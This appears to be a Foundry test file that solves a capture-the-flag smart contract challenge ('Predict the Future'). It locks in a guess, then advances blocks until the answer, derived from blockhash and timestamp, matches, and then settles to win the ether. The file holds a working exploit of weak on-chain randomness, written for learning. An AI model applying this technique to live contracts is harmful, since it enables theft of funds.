// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { PredictTheFutureChallenge } from "../src/challenges/08_PredictTheFuture/PredictTheFutureChallenge.sol";
import { PredictTheFutureChallengeFactory } from "../src/challenges/08_PredictTheFuture/PredictTheFutureChallengeFactory.sol";

contract PredictTheFutureTest is Test {
    PredictTheFutureChallenge public challenge;

    function setUp() public {
        PredictTheFutureChallengeFactory factory = new PredictTheFutureChallengeFactory();
        challenge = factory.createChallenge{ value: 1 ether }();
    }

    function test() public {
        challenge.lockInGuess{ value: 1 ether }(1);
        vm.roll(block.number + 1);

        uint8 answer;
        while (answer != 1) {
            vm.roll(block.number + 1);
            answer =
                uint8(
                    uint256(
                        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
                    )
                ) %
                10;
        }
        challenge.settle();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
